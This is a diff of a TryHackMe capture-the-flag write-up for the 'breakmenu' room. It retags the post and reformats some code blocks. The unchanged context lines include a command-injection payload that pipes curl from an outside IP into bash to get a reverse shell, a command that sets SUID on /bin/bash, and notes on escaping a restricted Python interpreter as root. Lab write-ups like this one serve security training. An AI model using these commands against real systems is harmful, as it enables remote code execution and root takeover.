@@ -1,16 +1,18 @@
 ---
 tags:
   - THM
-  - Linux
   - Medium
-  - CMS
+  - Linux
+  - WordPress
   - Brute-Force
+  - CVE
   - File-Upload
-  - RCE
-  - Forwarding
+  - Port-Forwarding
+  - Cmd-Injection
   - SUID
-  - File-Analysis
+  - Reversing
   - Race-Condition
+  - Cracking
   - Sudo
 ---
 https://tryhackme.com/room/breakmenu/
@@ -182,8 +184,8 @@ We concatenate commands by sending this payload and get reverse shell as **john*
 |curl${IFS}192.168.150.216${IFS}|bash
 ```
 Get the **first flag**:
-```console
-$ cat /home/john/user1.txt
+```bash
+cat /home/john/user1.txt
 ```
 ## Become youcef
 Found **SUID binary** owned by **youcef** user:
@@ -268,8 +270,8 @@ $ ssh -i id_rsa youcef@breakme.thm
 Enter passphrase for key 'id_rsa':
 ```
 Get the **second flag**:
-```console
-$ cat /home/youcef/.ssh/user2.txt
+```bash
+cat /home/youcef/.ssh/user2.txt
 ```
 # Become root
 We can execute a restricted Python interpreter as **root**:
@@ -295,8 +297,8 @@ There are many restricted words and functions. Found that the `os` module is alr
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f4fa4f46130>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/root/jail.py', '__cached__': None, 'os': <module 'os' from '/usr/lib/python3.9/os.py'>, 'malicious': <function malicious at 0x7f4fa4f9a040>, 'main': <function main at 0x7f4fa4e8a3a0>}
 ```
 Created a malicious file in the system:
-```console
-$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /tmp/a
+```bash
+echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /tmp/a
 ```
 Finally, inside the interpreter and using string manipulation, found a way to execute code:
 ```python
